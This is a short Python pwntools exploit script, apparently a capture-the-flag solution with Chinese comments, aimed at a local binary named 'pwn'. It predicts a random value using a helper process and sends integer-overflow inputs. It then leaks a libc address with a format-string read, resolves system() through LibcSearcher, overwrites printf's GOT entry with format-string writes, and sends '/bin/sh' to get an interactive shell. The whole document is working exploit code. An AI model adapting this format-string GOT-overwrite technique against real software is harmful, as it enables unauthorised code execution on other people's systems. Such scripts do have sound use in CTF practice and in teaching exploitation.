from pwn import *
from LibcSearcher import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./pwn')
t = process('./time')

# step 1:
# 碰撞随机数
p.recvuntil('Let\'s see how to pass the randomness and the unknown\n')
rand = int(t.recvuntil('aaaa')[:-4])
out = (rand+1919810) ^ 0x1BF52
p.sendline(str(out))

# step 2:
# 整数溢出
p.recvuntil('Input v1:\n')
p.sendline(str(4294967295))
p.recvuntil('Input v2:\n')
p.sendline(str(4294967195))

# step 3:
p.recvuntil('If you pass, I will give you shell as a gift\n')
elf = ELF('./pwn')
printf_got = elf.got['printf']

# 获取system地址
payload = b'%63$p'
p.send(payload)
libc_start_main = int(p.recv()[:14], 16) - 128
libc = LibcSearcher('__libc_start_main', libc_start_main)
libc_base = libc_start_main - libc.dump('__libc_start_main')
system = libc_base + libc.dump('system')

# 格式化字符串漏洞
payload  = b'%' + bytes(str(system & 0xff).encode()) + b'c%10$hhn'
payload += b'%' + bytes(str(((system>>8) & 0xffff) - (system & 0xff)).encode()) + b'c%11$hn'
payload = payload.ljust(0x20, b'a')
payload += p64(printf_got) + p64(printf_got + 1)
p.send(payload)

p.recv()
p.send(b'/bin/sh\x00')
p.interactive()

